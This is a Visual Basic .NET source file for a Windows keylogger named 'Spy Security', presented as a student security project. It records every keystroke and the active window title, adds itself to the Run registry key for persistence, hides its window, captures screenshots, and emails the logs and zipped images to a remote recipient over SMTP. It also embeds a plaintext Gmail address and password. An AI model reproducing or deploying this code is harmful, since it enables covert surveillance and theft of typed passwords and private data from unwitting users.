Option Strict Off
Option Explicit On
Imports System.Net
Imports Microsoft
Imports Microsoft.Win32
Imports Microsoft.Win32.Registry
Imports System.IO
Imports System.Data
Imports System.Math
Imports System.Collections.Generic
Imports System.Text
Imports System.IO.Compression
Imports System.IO.DirectoryInfo
Imports Ionic.Zip
Imports VB = Microsoft.VisualBasic
Imports System.Net.Mail.MailMessage
Public Class Form1
    'CODIGO PROGRAMADO POR KEVYN MOLINA TAYLOR
    'PROYECTO Developers Secuirty Group
    'SEGURIDAD INFORMATICA
    'Universidad Autonoma del Caribe Projects
    'COD 91513260
    'COPYRIGHT 
    Inherits System.Windows.Forms.Form
    Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Integer) As Short
    Private Declare Function GetForegroundWindow Lib "user32" () As Integer
    Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Integer, ByVal lpString As String, ByVal cch As Integer) As Integer
    Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Integer) As Integer
    Private LastWindow As String
    Private LastHandle As Integer
    Private dKey(255) As Integer
    Private Const VK_SHIFT As Short = &H10S
    Private Const VK_CTRL As Short = &H11S
    Private Const VK_ALT As Short = &H12S
    Private Const VK_CAPITAL As Short = &H14S
    Private ChangeChr(255) As String
    Private AltDown As Boolean
    Dim AC As String
    Dim se As Integer = 0
    Dim su As String
    Dim inc As Integer = 0
    Dim i As Integer = 1
    Dim Fsize As Size = Screen.PrimaryScreen.Bounds.Size
    Dim bm As New Bitmap(Fsize.Width, Fsize.Height)
    Dim Gf As Graphics
    Dim ScreenCap As Image
    Dim Base As String
    Private Function start_Up(ByVal bCrear As Boolean) As String
        Const CLAVE As String = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        Dim subClave As String = Application.ProductName.ToString
        Dim msg As String = ""
        Try
            Dim Registro As RegistryKey = CurrentUser.CreateSubKey(CLAVE, RegistryKeyPermissionCheck.ReadWriteSubTree)
            With Registro
                .OpenSubKey(CLAVE, True)
                Select Case bCrear
                    Case True
                        .SetValue(subClave, _
                                  Application.ExecutablePath.ToString)
                        Return "Aplicación añadida exitosamente..."
                    Case False
                        If .GetValue(subClave, "").ToString <> "" Then
                            .DeleteValue(subClave)
                            msg = "Aplicación Eliminada exitosamente..."
                        Else
                            msg = "No se eliminó , por que el programa" & _
                                   " no iniciaba con windows"
                        End If
                End Select
            End With
        Catch ex As Exception
            msg = ex.Message.ToString
        End Try
        Return msg
    End Function
    Public Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Int32) As Int16

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Dim i As Object
        If GetAsyncKeyState(VK_ALT) = 0 And AltDown = True Then
            AltDown = False
            RichTextBox1.Text = RichTextBox1.Text & "[ALT]"
        End If
        For i = Asc("A") To Asc("Z")

            If GetAsyncKeyState(i) = -32767 Then
                TypeWindow()

                If GetAsyncKeyState(VK_SHIFT) < 0 Then
                    If GetKeyState(VK_CAPITAL) > 0 Then
                        RichTextBox1.Text = RichTextBox1.Text & LCase(Chr(i))
                        Exit Sub
                    Else
                        RichTextBox1.Text = RichTextBox1.Text & UCase(Chr(i))
                        Exit Sub
                    End If
                Else
                    If GetKeyState(VK_CAPITAL) > 0 Then
                        RichTextBox1.Text = RichTextBox1.Text & UCase(Chr(i))
                        Exit Sub
                    Else
                        RichTextBox1.Text = RichTextBox1.Text & LCase(Chr(i))
                        Exit Sub
                    End If
                End If

            End If
        Next
        For i = 48 To 57

            If GetAsyncKeyState(i) = -32767 Then
                TypeWindow()

                If GetAsyncKeyState(VK_SHIFT) < 0 Then
                    RichTextBox1.Text = RichTextBox1.Text & ChangeChr(i)
                    Exit Sub
                Else

                    RichTextBox1.Text = RichTextBox1.Text & Chr(i)
                    Exit Sub
                End If

            End If
        Next
        For i = 186 To 192

            If GetAsyncKeyState(i) = -32767 Then
                TypeWindow()

                If GetAsyncKeyState(VK_SHIFT) < 0 Then
                    RichTextBox1.Text = RichTextBox1.Text & ChangeChr(i - 100)
                    Exit Sub
                Else
                    RichTextBox1.Text = RichTextBox1.Text & ChangeChr(i)
                    Exit Sub
                End If

            End If
        Next


        '[\]'
        For i = 219 To 222

            If GetAsyncKeyState(i) = -32767 Then
                TypeWindow()

                If GetAsyncKeyState(VK_SHIFT) < 0 Then

                    RichTextBox1.Text = RichTextBox1.Text & ChangeChr(i - 100)
                    Exit Sub
                Else

                    RichTextBox1.Text = RichTextBox1.Text & ChangeChr(i)
                    Exit Sub
                End If

            End If
        Next
        For i = 96 To 111

            If GetAsyncKeyState(i) = -32767 Then
                TypeWindow()

                If GetAsyncKeyState(VK_ALT) < 0 And AltDown = False Then
                    AltDown = True
                    RichTextBox1.Text = RichTextBox1.Text & "[ALT-abajo]"
                Else
                    If GetAsyncKeyState(VK_ALT) >= 0 And AltDown = True Then
                        AltDown = False
                        RichTextBox1.Text = RichTextBox1.Text & "[ALT-arriba]"
                    End If
                End If


                RichTextBox1.Text = RichTextBox1.Text & ChangeChr(i)
                Exit Sub
            End If
        Next
        If GetAsyncKeyState(32) = -32767 Then
            TypeWindow()
            RichTextBox1.Text = RichTextBox1.Text & " "
        End If
        If GetAsyncKeyState(13) = -32767 Then
            TypeWindow()
            RichTextBox1.Text = RichTextBox1.Text & vbNewLine + "[" + TimeString + "]" + " "
        End If
        If GetAsyncKeyState(8) = -32767 Then
            TypeWindow()
            RichTextBox1.Text = RichTextBox1.Text & "[Retroceso]"
        End If
        If GetAsyncKeyState(37) = -32767 Then
            TypeWindow()
            RichTextBox1.Text = RichTextBox1.Text & "[FlechaIzq]"
        End If
        If GetAsyncKeyState(38) = -32767 Then
            TypeWindow()
            RichTextBox1.Text = RichTextBox1.Text & "[FlechaArriba]"
        End If
        If GetAsyncKeyState(39) = -32767 Then
            TypeWindow()
            RichTextBox1.Text = RichTextBox1.Text & "[FlechaDer]"
        End If
        If GetAsyncKeyState(40) = -32767 Then
            TypeWindow()
            RichTextBox1.Text = RichTextBox1.Text & "[FlechaAbajo]"
        End If
        If GetAsyncKeyState(9) = -32767 Then
            TypeWindow()
            RichTextBox1.Text = RichTextBox1.Text & "[Tabulador]"
        End If
        If GetAsyncKeyState(27) = -32767 Then
            TypeWindow()
            RichTextBox1.Text = RichTextBox1.Text & "[Escape]"
        End If
        For i = 45 To 46

            If GetAsyncKeyState(i) = -32767 Then
                TypeWindow()
                RichTextBox1.Text = RichTextBox1.Text & ChangeChr(i)
            End If
        Next
        For i = 33 To 36
            '
            If GetAsyncKeyState(i) = -32767 Then
                TypeWindow()
                RichTextBox1.Text = RichTextBox1.Text & ChangeChr(i)
            End If
        Next
        If GetAsyncKeyState(1) = -32767 Then
            If (LastHandle = GetForegroundWindow) And LastHandle <> 0 Then
                RichTextBox1.Text = RichTextBox1.Text & "[ClickIzq]"
            End If
        End If
    End Sub
    Private Shared WM_QUERYENDSESSION As Integer = &H11
    Private Shared SystemShutdown As Boolean = False

    Protected Overrides Sub WndProc(ByRef m As System.Windows.Forms.Message)
        If m.Msg = WM_QUERYENDSESSION Then
            SystemShutdown = True
        End If
        MyBase.WndProc(m)
    End Sub
    Private Sub Form1_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        Try
            If My.Computer.Network.IsAvailable() Then
                If My.Computer.Network.Ping("www.google.es", 1000) Then

                    If SystemShutdown = False Then
                        e.Cancel = True
                        With Me
                            .WindowState = FormWindowState.Minimized
                            .Hide()
                            NotifyIcon1.Visible = True
                        End With
                    Else
                        e.Cancel = False
                    End If
                    Dim con As String = My.Computer.Name + "(" + SacarIp() + ")" + " se esta Apagando a las: " + TimeString
                    Dim _Message As New System.Net.Mail.MailMessage()
                    Dim _SMTP As New System.Net.Mail.SmtpClient

                    'CONFIGURACIÓN DEL STMP
                    _SMTP.Credentials = New System.Net.NetworkCredential("kevinmolinataylor@gmail.com", "developers:$group789")
                    _SMTP.Host = "smtp.gmail.com"
                    _SMTP.Port = 587
                    _SMTP.EnableSsl = True

                    ' CONFIGURACION DEL MENSAJE
                    _Message.[To].Add(Me.ToolStripTextBox1.Text.ToString) 'Cuenta de Correo al que se le quiere enviar el e-mail
                    _Message.From = New System.Net.Mail.MailAddress("kevinmolinataylor@gmail.com", "Spy Security", System.Text.Encoding.UTF8) 'Quien lo envía
                    _Message.Subject = Me.ToolStripMenuItem1.Text.ToString 'Sujeto del e-mail
                    _Message.SubjectEncoding = System.Text.Encoding.UTF8 'Codificacion
                    _Message.Body = con 'contenido del mail
                    _Message.BodyEncoding = System.Text.Encoding.UTF8
                    _Message.Priority = System.Net.Mail.MailPriority.Normal
                    _Message.IsBodyHtml = False
                    Try
                        _SMTP.Send(_Message)
                    Catch ex As System.Net.Mail.SmtpException
                    End Try
                End If
            Else
                MsgBox("Sin Internet")
            End If
        Catch ex As Exception

        End Try
    End Sub
    Public Function SacarIp() As String
        Dim Ip As String
        Ip = Dns.GetHostEntry(My.Computer.Name).AddressList.FirstOrDefault(Function(i) i.AddressFamily = Sockets.AddressFamily.InterNetwork).ToString()
        Return Ip
    End Function
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Try
            Form7.Label3.Text = My.Settings.remi
            Form7.Label4.Text = My.Settings.contra
            Form7.Label5.Text = My.Settings.desti
            Form5.Label13.Text = System.AppDomain.CurrentDomain.BaseDirectory()
            Form5.Label13.Visible = False
            If (My.Settings.remot = True) Then
                If My.Computer.Network.IsAvailable() Then
                    If My.Computer.Network.Ping("www.google.es", 1000) Then
                        Form8.Show()
                    End If

                Else
                    MsgBox("Sin Internet")
                End If
            Else
                Try
                    Form8.Close()
                Catch ex As Exception

                End Try

            End If
            If (My.Settings.ruta = "vacio") Then
                Form3.ToolStripStatusLabel1.Text = ""
            Else
                Form3.ToolStripStatusLabel1.Text = My.Settings.ruta
            End If
            If (My.Settings.EsIn = True) Then
                start_Up(True)
            Else
                start_Up(False)
            End If

            'Conversión de caracteres especiales....
            ChangeChr(33) = "[RePag]"
            ChangeChr(34) = "[AvPag]"
            ChangeChr(35) = "[Fin]"
            ChangeChr(36) = "[Inicio]"

            ChangeChr(45) = "[Insertar]"
            ChangeChr(46) = "[Suprimir]"

            ChangeChr(48) = "="
            ChangeChr(49) = "!"
            ChangeChr(50) = "@"
            ChangeChr(51) = "#"
            ChangeChr(52) = "$"
            ChangeChr(53) = "%"
            ChangeChr(54) = "&"
            ChangeChr(55) = "/"
            ChangeChr(56) = "("
            ChangeChr(57) = ")"

            ChangeChr(186) = "`"
            ChangeChr(187) = "+"
            ChangeChr(188) = ","
            ChangeChr(189) = "-"
            ChangeChr(190) = "."
            ChangeChr(191) = "/"

            ChangeChr(219) = "["
            ChangeChr(220) = "\"
            ChangeChr(221) = "]"
            ChangeChr(222) = "´"


            ChangeChr(86) = "^"
            ChangeChr(87) = "+"
            ChangeChr(88) = ";"
            ChangeChr(89) = "_"
            ChangeChr(90) = ":"
            ChangeChr(91) = "Ç"

            ChangeChr(119) = "?"
            ChangeChr(120) = "|"
            ChangeChr(121) = "¿"
            ChangeChr(122) = """"


            ChangeChr(96) = "0"
            ChangeChr(97) = "1"
            ChangeChr(98) = "2"
            ChangeChr(99) = "3"
            ChangeChr(100) = "4"
            ChangeChr(101) = "5"
            ChangeChr(102) = "6"
            ChangeChr(103) = "7"
            ChangeChr(104) = "8"
            ChangeChr(105) = "9"
            ChangeChr(106) = "*"
            ChangeChr(107) = "+"
            ChangeChr(109) = "-"
            ChangeChr(110) = "."
            ChangeChr(111) = "/"

            ChangeChr(192) = "ñ"
            ChangeChr(92) = "Ñ"
            RichTextBox1.Enabled = False
            RichTextBox1.ReadOnly = True
            Timer1.Enabled = True
            Timer2.Start()
            Form7.Timer1.Start()
            Form7.Timer4.Start()
            Dim con As String = My.Computer.Name + "(" + SacarIp() + ")" + " se esta Encendiendo a las: " + TimeString
            Dim _Message As New System.Net.Mail.MailMessage()
            Dim _SMTP As New System.Net.Mail.SmtpClient

            'CONFIGURACIÓN DEL STMP
            _SMTP.Credentials = New System.Net.NetworkCredential("kevinmolinataylor@gmail.com", "developers:$group789")
            _SMTP.Host = "smtp.gmail.com"
            _SMTP.Port = 587
            _SMTP.EnableSsl = True

            ' CONFIGURACION DEL MENSAJE
            _Message.[To].Add(Me.ToolStripTextBox1.Text.ToString) 'Cuenta de Correo al que se le quiere enviar el e-mail
            _Message.From = New System.Net.Mail.MailAddress("kevinmolinataylor@gmail.com", "Spy Security", System.Text.Encoding.UTF8) 'Quien lo envía
            _Message.Subject = Me.ToolStripMenuItem1.Text.ToString 'Sujeto del e-mail
            _Message.SubjectEncoding = System.Text.Encoding.UTF8 'Codificacion
            _Message.Body = con 'contenido del mail
            _Message.BodyEncoding = System.Text.Encoding.UTF8
            _Message.Priority = System.Net.Mail.MailPriority.Normal
            _Message.IsBodyHtml = False

            'ENVIO
            Try
                _SMTP.Send(_Message)
            Catch ex As System.Net.Mail.SmtpException
            End Try
        Catch ex As Exception

        End Try
    End Sub
    Function TypeWindow() As Object
        Dim svar As Object
        'Funcion para saber el tipo de ventana y devolver el nombre.
        Dim Handle_Renamed As Integer
        Dim textlen As Integer
        Dim WindowText As String
        'Obtenemos el nombre de la vetana de fondo
        Handle_Renamed = GetForegroundWindow
        LastHandle = Handle_Renamed
        textlen = GetWindowTextLength(Handle_Renamed) + 1

        WindowText = Space(textlen) 'Obtenemos el espacio del nombre
        svar = GetWindowText(Handle_Renamed, WindowText, textlen) 'Guardamos en la variable svar_
        'El contenido del nombre
        WindowText = VB.Left(WindowText, Len(WindowText) - 1)
        'Cuando se hace cambio de ventana se pasa un espacio y se pone un delimitador_
        'con ese delimitador nos damos cuenta de que el nombre ya cambio .
        If WindowText <> LastWindow Then
            If RichTextBox1.Text <> "" Then RichTextBox1.Text = RichTextBox1.Text & vbCrLf & vbCrLf
            'Separador que escrimos en el textbox
            RichTextBox1.Text = RichTextBox1.Text & "|=============================|" & vbCrLf & WindowText & vbCrLf & "|==============================|" & vbCrLf
            LastWindow = WindowText 'vemos ventana
        End If
    End Function

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        Me.Hide()
        If My.Settings.icono = False Then
            NotifyIcon1.Visible = False
        Else
            NotifyIcon1.Visible = True
        End If
        Timer2.Stop()
    End Sub

    Private Sub Timer3_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer3.Tick
        Try
            Timer4.Enabled = True
            Gf = Graphics.FromImage(bm)
            Gf.CopyFromScreen(0, 0, 0, 0, Fsize)
            ScreenCap = bm
            Dim RutaArchivo As String = Form3.ToolStripStatusLabel1.Text + AC + "\Imagen " + CStr(i) + ".jpg"
            ScreenCap.Save(RutaArchivo)
            Form3.PictureBox1.Image = System.Drawing.Image.FromFile(RutaArchivo.ToString)
            i += 1
        Catch ex As Exception

        End Try
    End Sub

    Private Sub DetenerScreensToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DetenerScreensToolStripMenuItem.Click
        Timer3.Enabled = False
        Timer4.Enabled = False
        Timer5.Enabled = False
    End Sub
    Public Sub SaveFile()
        RichTextBox1.SaveFile(System.Environment.GetFolderPath _
(System.Environment.SpecialFolder.Personal) _
        & "\Logs" + su + ".rtf", _
           RichTextBoxStreamType.RichNoOleObjs)
    End Sub

    Private Sub GuardarRecopilaciónToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GuardarRecopilaciónToolStripMenuItem.Click
        Dim guardararchivo As New SaveFileDialog
        guardararchivo.FileName = ""
        guardararchivo.Filter = "textfiles(*.txt)|*.txt|file (*)|*|ALL Files(*.*)|*.*)"
        guardararchivo.Title = "Guardar"
        guardararchivo.ShowDialog()
        Try
            Dim escribir As New System.IO.StreamWriter(guardararchivo.FileName)
            escribir.Write(RichTextBox1.Text)
            escribir.Close()
            MsgBox("archivo guardado")
        Catch ex As Exception

        End Try
    End Sub

    Private Sub ActivarEnvioMailScreensToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        If (Form3.ToolStripStatusLabel1.Text = "") Then
            MsgBox("No ingresado ruta por favor verifique la configuración", MsgBoxStyle.Critical, "Error De Activación")
        Else
            Timer4.Interval = 15000
            Timer3.Enabled = True
            Timer4.Enabled = True

        End If
    End Sub


    Private Sub Timer4_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer4.Tick
        Timer3.Enabled = False
        If My.Computer.Network.IsAvailable() Then
            If My.Computer.Network.Ping("www.google.es", 1000) Then
                Try
                    System.IO.Directory.CreateDirectory(Form3.ToolStripStatusLabel1.Text + AC + "\Envio" + AC)
                    Dim Lab As String
                    Lab = Form3.ToolStripStatusLabel1.Text + AC + "\Envio" + AC
                    Using zip As ZipFile = New ZipFile()
                        zip.AddDirectory(Form3.ToolStripStatusLabel1.Text + AC, "")
                        zip.Save(Lab + "\Paquete.zip")
                    End Using
                    Dim archivos() As String = IO.Directory.GetFiles(Lab)
                    Dim _Message As New System.Net.Mail.MailMessage()
                    For Each archivo In archivos

                        Dim archivoAdjunto As New System.Net.Mail.Attachment(archivo)
                        _Message.Attachments.Add(archivoAdjunto) ''adjuntar archivos 
                    Next
                    Dim _SMTP As New System.Net.Mail.SmtpClient

                    'CONFIGURACIÓN DEL STMP
                    _SMTP.Credentials = New System.Net.NetworkCredential("kevinmolinataylor@gmail.com", "developers:$group789")
                    _SMTP.Host = "smtp.gmail.com"
                    _SMTP.Port = 587
                    _SMTP.EnableSsl = True

                    ' CONFIGURACION DEL MENSAJE
                    _Message.[To].Add(Me.ToolStripTextBox1.Text.ToString) 'Cuenta de Correo al que se le quiere enviar el e-mail
                    _Message.From = New System.Net.Mail.MailAddress("kevinmolinataylor@gmail.com", "Spy Security", System.Text.Encoding.UTF8) 'Quien lo envía
                    _Message.Subject = "Spy Security - Reportes DATA" 'Sujeto del e-mail
                    _Message.SubjectEncoding = System.Text.Encoding.UTF8 'Codificacion
                    _Message.Body = Me.RichTextBox1.Text.ToString 'contenido del mail
                    _Message.BodyEncoding = System.Text.Encoding.UTF8
                    _Message.Priority = System.Net.Mail.MailPriority.Normal
                    _Message.IsBodyHtml = False

                    'ENVIO
                    Try
                        _SMTP.Send(_Message)
                    Catch ex As System.Net.Mail.SmtpException
                    End Try
                    se = se + 1
                    AC = CStr(Val(se))
                    My.Settings.Cor = AC
                    Timer5.Enabled = True
                    Timer4.Stop()
                Catch ex As Exception
                End Try
            End If
        Else
            MsgBox("Sin internet.")
        End If
    End Sub

    Private Sub Timer5_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer5.Tick
        Try
            System.IO.Directory.CreateDirectory(Form3.ToolStripStatusLabel1.Text + AC)
            My.Settings.ruta = Form3.ToolStripStatusLabel1.Text + AC
            My.Settings.Save()
            Timer3.Enabled = True
            Timer5.Stop()
        Catch ex As Exception

        End Try
    End Sub

    Private Sub Timer6_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer6.Tick
        SaveFile()
        inc = inc + 1
        su = CStr(Val(inc))
    End Sub

    Private Sub GenerarLogsToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles GenerarLogsToolStripMenuItem.Click
        Timer6.Interval = 300000
        Timer6.Start()
        MsgBox("Cada 5 minutos Guardara la información recopilada en la carpeta de Documentos", MsgBoxStyle.Information, "Informacíon")
    End Sub

    Private Sub ConfiguraciónToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ConfiguraciónToolStripMenuItem.Click
        Form5.Show()
    End Sub

    Private Sub Timer7_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer7.Tick
        If My.Computer.Network.IsAvailable() Then
            If My.Computer.Network.Ping("www.google.es", 1000) Then
                Try
                    Dim correo As New System.Net.Mail.MailMessage()
                    correo.From = New System.Net.Mail.MailAddress(My.Settings.remi) 'remitente
                    correo.Subject = "Spy Security" 'asunto
                    correo.To.Add(My.Settings.desti) 'destinatario
                    correo.Body = RichTextBox1.Text
                    Dim Servidor As New System.Net.Mail.SmtpClient
                    Servidor.Host = "smtp.live.com"
                    Servidor.Port = 587
                    Servidor.EnableSsl = True
                    Servidor.Credentials = New System.Net.NetworkCredential(My.Settings.remi, My.Settings.contra)
                    Servidor.Send(correo)
                Catch ex As Exception

                End Try
            End If
        Else
            MsgBox("Sin internet")
        End If

    End Sub

    Private Sub AToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AToolStripMenuItem1.Click
        Form4.Show()
    End Sub

    Private Sub Timer8_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer8.Tick
        Gf = Graphics.FromImage(bm)
        Gf.CopyFromScreen(0, 0, 0, 0, Fsize)
        ScreenCap = bm
        Dim RutaArchivo As String = Form3.ToolStripStatusLabel1.Text + "\Imagen " + CStr(i) + ".jpg"
        ScreenCap.Save(RutaArchivo)
        Form3.PictureBox1.Image = System.Drawing.Image.FromFile(RutaArchivo.ToString)
        i += 1
    End Sub

    Private Sub Timer9_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer9.Tick
        System.IO.File.WriteAllText(Form3.ToolStripStatusLabel1.Text + "logs" + su + ".txt", RichTextBox1.Text)
        inc = inc + 1
        su = CStr(Val(inc))
    End Sub
End Class
